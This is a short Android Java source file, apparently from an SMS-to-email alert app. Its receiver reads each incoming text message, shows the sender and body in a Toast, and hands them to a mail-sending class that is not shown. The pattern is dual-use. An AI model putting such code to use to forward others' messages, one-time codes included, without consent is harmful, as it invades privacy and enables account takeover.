package com.mailalert;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.widget.Toast;

import java.util.Date;

public class MessageReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

   SmsMessage messages[]= Telephony.Sms.Intents.getMessagesFromIntent(intent);
   StringBuffer sb=new StringBuffer();
   for(int i=0;i<messages.length;i++)
   {
       sb.append(" Sms Received from "+messages[i].getOriginatingAddress()+" and message is  "+messages[i].getMessageBody()+"\n");

   }

        Toast.makeText(context, sb.toString(), Toast.LENGTH_SHORT).show();

new CheckMailAndSend().send(context,"Messsage",sb.toString(),new Date());

    }
}
